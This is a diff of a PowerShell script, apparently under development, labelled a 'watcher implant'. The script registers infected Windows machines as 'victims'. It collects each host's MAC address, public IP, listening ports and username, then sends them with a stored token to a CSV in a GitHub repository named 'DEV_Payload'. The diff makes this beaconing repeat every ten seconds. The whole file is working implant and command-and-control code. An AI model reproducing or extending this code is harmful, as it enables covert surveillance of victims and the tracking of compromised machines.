@@ -1,10 +1,9 @@
 # ===============================================
-# UNIVERSAL WATCHER IMPLANT
-# Compatible with Windows 7–11, Server editions
+# UNIVERSAL WATCHER IMPLANT (REGISTER ONLY)
 # ===============================================
 
 # === CONFIGURATION SETTINGS ===
-$GitHubToken = Get-Content -Path "D:\github_token.txt" -Raw
+$GitHubToken          = Get-Content -Path "D:\github_token.txt" -Raw
 $RepoOwner            = "Umair13303"
 $RepoName             = "DEV_Payload"
 $CsvPathInRepo        = "GitHub_Script/Excel/Victim_Record_GitHub.csv"
@@ -16,6 +15,7 @@ $RegistryValue        = "PRE_ATTACK_GUID_REG_KEY"
 $PayloadFolder        = "$env:APPDATA\Payloads"
 $LogFile              = "$env:APPDATA\watcher_log.txt"
 
+$LoopIntervalSeconds  = 10
 $UserAgent            = "Watcher-Script"
 
 # === LOGGING FUNCTION ===
@@ -30,7 +30,7 @@ if (-not (Test-Path $PayloadFolder)) {
     New-Item -ItemType Directory -Path $PayloadFolder | Out-Null
 }
 Log-Message "[$(Get-Date)] === Watcher started ==="
-[System.Windows.MessageBox]::Show("Watcher started.")
+[System.Windows.MessageBox]::Show("Watcher started. --1")
 
 # === LOAD OR GENERATE VICTIM GUID ===
 $Victim_GUID = ""
@@ -52,7 +52,7 @@ if (-not $Victim_GUID -or $Victim_GUID -eq "") {
     $Victim_GUID | Out-File -Encoding UTF8 -FilePath $GuidFile
 }
 Log-Message "[$(Get-Date)] GUID: $Victim_GUID"
-[System.Windows.MessageBox]::Show("GUID: $Victim_GUID")
+[System.Windows.MessageBox]::Show("GUID --2: $Victim_GUID")
 
 # === INITIALIZE WEB CLIENT ===
 $wc = New-Object System.Net.WebClient
@@ -63,101 +63,105 @@ $wc.Headers.Add("Accept", "application/vnd.github.v3+json")
 # === ADD MessageBox ===
 Add-Type -AssemblyName PresentationFramework
 
-# === FETCH CSV METADATA AND DOWNLOAD URL ===
-try {
-    [System.Windows.MessageBox]::Show("Fetching CSV metadata...")
-    $MetaURL = "https://api.github.com/repos/$RepoOwner/$RepoName/contents/$CsvPathInRepo"
-    $metaJson = $wc.DownloadString($MetaURL)
-    $metaObj = ConvertFrom-Json $metaJson
-    $downloadUrl = $metaObj.download_url
-    $sha = $metaObj.sha
+# === LOOP FOREVER ===
+while ($true) {
+    try {
+        [System.Windows.MessageBox]::Show("Checking registration status... ---3")
 
-    if (-not $downloadUrl) {
-        throw "Failed to obtain download URL."
-    }
+        # Fetch CSV metadata
+        $MetaURL = "https://api.github.com/repos/$RepoOwner/$RepoName/contents/$CsvPathInRepo"
+        $metaJson = $wc.DownloadString($MetaURL)
+        $metaObj = ConvertFrom-Json $metaJson
+        $downloadUrl = $metaObj.download_url
+        $sha = $metaObj.sha
 
-    [System.Windows.MessageBox]::Show("Download URL fetched successfully.")
-
-    $csvText = $wc.DownloadString($downloadUrl)
-    $lines = $csvText -split "`r?`n"
-
-    $alreadyExists = $false
-
-    foreach ($line in $lines) {
-        if ($line -match "^\d+,") {
-            $cols = $line -split ","
-            if ($cols[1] -eq $Victim_GUID) {
-                $alreadyExists = $true
-                break
-            }
+        if (-not $downloadUrl) {
+            throw "Failed to obtain download URL."
         }
-    }
 
-    if (-not $alreadyExists) {
-        [System.Windows.MessageBox]::Show("Victim not found in CSV. Registering...")
-        # === COLLECT SYSTEM INFO ===
-        $macs = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress }
-        $mac  = if ($macs.Count -gt 0) { $macs[0].MACAddress } else { "UNKNOWN" }
+        $csvText = $wc.DownloadString($downloadUrl)
+        $lines = $csvText -split "`r?`n"
 
-        try {
-            $ip = (New-Object Net.WebClient).DownloadString("https://api.ipify.org")
-        } catch { $ip = "UNKNOWN" }
+        $alreadyExists = $false
 
-        try {
-            $ports = netstat -an | Select-String "LISTENING" | ForEach-Object {
-                ($_ -split "\s+")[-2] -replace ".*:", ""
-            }
-            $ports = ($ports | Sort-Object -Unique) -join ";"
-        } catch { $ports = "UNKNOWN" }
-
-        $user = $env:USERNAME
-        $pass = "NOT_CAPTURED"
-
-        # === CREATE NEW CSV ROW ===
-        $lastId = 0
         foreach ($line in $lines) {
             if ($line -match "^\d+,") {
-                $id = ($line -split ",")[0]
-                if ([int]::TryParse($id, [ref]$null) -and [int]$id -gt $lastId) {
-                    $lastId = [int]$id
+                $cols = $line -split ","
+                if ($cols[1] -eq $Victim_GUID) {
+                    $alreadyExists = $true
+                    break
                 }
             }
         }
-        $newId = $lastId + 1
 
-        $newRow = "$newId,$Victim_GUID,$mac,$ip,$ports,$user,$pass,,," + "FALSE"
+        if (-not $alreadyExists) {
+            [System.Windows.MessageBox]::Show("Victim not found. Registering... --4")
+            # === COLLECT SYSTEM INFO ===
+            $macs = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress }
+            $mac  = if ($macs.Count -gt 0) { $macs[0].MACAddress } else { "UNKNOWN" }
 
-        $allLines = $lines + $newRow
-        $finalCsv = ($allLines -join "`n")
-        $encoded  = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($finalCsv))
+            try {
+                $ip = (New-Object Net.WebClient).DownloadString("https://api.ipify.org")
+            } catch { $ip = "UNKNOWN" }
 
-        $body = @{
-            message = "Register new victim $newId"
-            content = $encoded
-            sha     = $sha
-        } | ConvertTo-Json -Compress
+            try {
+                $ports = netstat -an | Select-String "LISTENING" | ForEach-Object {
+                    ($_ -split "\s+")[-2] -replace ".*:", ""
+                }
+                $ports = ($ports | Sort-Object -Unique) -join ";"
+            } catch { $ports = "UNKNOWN" }
 
-        # === UPLOAD UPDATED CSV BACK TO GITHUB ===
-        $upload = [System.Net.WebRequest]::Create($MetaURL)
-        $upload.Method = "PUT"
-        $upload.Headers.Add("Authorization", "token $GitHubToken")
-        $upload.ContentType = "application/json"
-        $upload.UserAgent = $UserAgent
-        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
-        $reqStream = $upload.GetRequestStream()
-        $reqStream.Write($bytes, 0, $bytes.Length)
-        $reqStream.Close()
-        $upload.GetResponse().Close()
+            $user = $env:USERNAME
+            $pass = "NOT_CAPTURED"
 
-        Log-Message "[$(Get-Date)] ✅ New victim registered."
-        [System.Windows.MessageBox]::Show("User successfully registered.")
+            # === CREATE NEW CSV ROW ===
+            $lastId = 0
+            foreach ($line in $lines) {
+                if ($line -match "^\d+,") {
+                    $id = ($line -split ",")[0]
+                    if ([int]::TryParse($id, [ref]$null) -and [int]$id -gt $lastId) {
+                        $lastId = [int]$id
+                    }
+                }
+            }
+            $newId = $lastId + 1
+
+            $newRow = "$newId,$Victim_GUID,$mac,$ip,$ports,$user,$pass,,," + "FALSE"
+
+            $allLines = $lines + $newRow
+            $finalCsv = ($allLines -join "`n")
+            $encoded  = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($finalCsv))
+
+            $body = @{
+                message = "Register new victim $newId"
+                content = $encoded
+                sha     = $sha
+            } | ConvertTo-Json -Compress
+
+            # === Upload updated CSV ===
+            $upload = [System.Net.WebRequest]::Create($MetaURL)
+            $upload.Method = "PUT"
+            $upload.Headers.Add("Authorization", "token $GitHubToken")
+            $upload.ContentType = "application/json"
+            $upload.UserAgent = $UserAgent
+            $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
+            $reqStream = $upload.GetRequestStream()
+            $reqStream.Write($bytes, 0, $bytes.Length)
+            $reqStream.Close()
+            $upload.GetResponse().Close()
+
+            Log-Message "[$(Get-Date)] ✅ New victim registered."
+            [System.Windows.MessageBox]::Show("User successfully registered. ---5")
+        }
+        else {
+            Log-Message "[$(Get-Date)] Victim already registered."
+            [System.Windows.MessageBox]::Show("User already registered. ---6")
+        }
     }
-    else {
-        Log-Message "[$(Get-Date)] Victim already registered."
-        [System.Windows.MessageBox]::Show("User already registered.")
+    catch {
+        Log-Message "[$(Get-Date)] ❌ Error: $_"
+        [System.Windows.MessageBox]::Show("Error: --7" + $_)
     }
-}
-catch {
-    Log-Message "[$(Get-Date)] ❌ Registration failed: $_"
-    [System.Windows.MessageBox]::Show("Registration failed: " + $_)
+
+    Start-Sleep -Seconds $LoopIntervalSeconds
 }
